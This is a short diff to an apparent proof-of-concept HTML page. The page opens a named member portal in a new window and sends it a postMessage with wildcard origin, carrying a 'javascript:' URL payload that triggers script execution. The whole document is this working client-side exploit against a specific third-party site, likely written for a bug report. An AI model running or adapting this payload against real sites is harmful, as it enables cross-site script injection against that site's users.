@@ -9,12 +9,15 @@
     <h1>POC</h1>
 
     <iframe sandbox="allow-scripts allow-forms allow-popups" srcdoc="
-        <script>
+        &lt;script>
             var target = window.open('https://member-env3.opers.org/member/home');
             setTimeout(function() {
-                target.postMessage('your_payload_here', '*');
+                target.postMessage(JSON.stringify({
+  action: 'href',
+  url: 'javascript:alert(1)'
+}), '*');
             }, 3000);
-        </script>
+        &lt;/script>
     "></iframe>
 
 </body>
